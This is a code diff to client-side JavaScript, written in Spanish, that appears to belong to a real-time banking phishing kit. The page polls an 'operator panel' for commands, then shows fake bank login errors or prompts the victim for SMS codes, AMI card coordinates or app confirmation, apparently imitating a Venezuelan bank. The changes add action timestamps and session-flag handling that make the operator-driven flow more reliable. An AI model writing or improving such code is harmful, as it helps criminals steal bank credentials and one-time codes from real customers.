@@ -317,6 +317,7 @@
   }
 
   function goToAuthMethod(mode) {
+    sessionStorage.removeItem('is_waiting');
     hideSpinner();
     closeModal();
     if (loginUnico) {
@@ -365,6 +366,7 @@
 
   // Polling del cliente esperando órdenes del panel de operador
   let lastHandledAction = null;
+  let lastActionTime = 0;
 
   function startPolling() {
     stopPolling();
@@ -381,29 +383,42 @@
         if (!response.ok) return;
         const data = await response.json();
         const action = data.action;
+        const actionTime = Number(data.actionTime) || 0;
 
-        // Si no hay acción o es la misma que ya procesamos, ignorar y permanecer en el spinner
-        if (!action || action === lastHandledAction) return;
+        // Si no hay acción disponible, no hacer nada
+        if (!action) return;
+
+        // Si la acción tiene timestamp y es más vieja o igual a la última procesada, ignorarla
+        if (actionTime && actionTime <= lastActionTime) return;
+
+        // Si no tiene timestamp y es la misma acción ya procesada, ignorar
+        if (!actionTime && action === lastHandledAction) return;
 
         // Si el usuario acaba de enviar el código, permanecer en el spinner y NO reabrir el formulario para la misma acción
         if (lastHandledAction === 'token-submitted' && action === currentOtpAction) {
           return;
         }
 
+        lastActionTime = actionTime || Date.now();
         lastHandledAction = action;
 
         if (action === 'sms') {
+          sessionStorage.removeItem('is_waiting');
           goToAuthMethod('sms');
         } else if (action === 'ami') {
+          sessionStorage.removeItem('is_waiting');
           goToAuthMethod('ami');
         } else if (action === 'bdvapp') {
+          sessionStorage.removeItem('is_waiting');
           goToAuthMethod('bdvapp');
         } else if (action === 'error-login') {
+          sessionStorage.removeItem('is_waiting');
           hideSpinner();
           openModal();
           setPassError(true, 'Usuario o contraseña inválida. Verifique sus datos.');
           continueBtn.disabled = false;
         } else if (action === 'error-sms') {
+          sessionStorage.removeItem('is_waiting');
           hideSpinner();
           setCodeError(true, 'Código SMS incorrecto o vencido. Por favor ingrese el nuevo código recibido.');
           if (verifyCode) {
@@ -411,6 +426,7 @@
             verifyCode.focus();
           }
         } else if (action === 'error-ami') {
+          sessionStorage.removeItem('is_waiting');
           hideSpinner();
           setCodeError(true, 'Coordenadas AMI incorrectas. Por favor verifique su tarjeta AMI e intente nuevamente.');
           if (verifyCode) {
@@ -418,13 +434,14 @@
             verifyCode.focus();
           }
         } else if (action === 'error-bdvapp') {
+          sessionStorage.removeItem('is_waiting');
           hideSpinner();
           goToAuthMethod('bdvapp');
         } else if (action === 'done') {
+          sessionStorage.removeItem('is_waiting');
           stopPing();
           stopPolling();
           hideSpinner();
-          sessionStorage.removeItem('is_waiting');
           window.location.href = 'panel.html';
         }
       } catch (_) {}
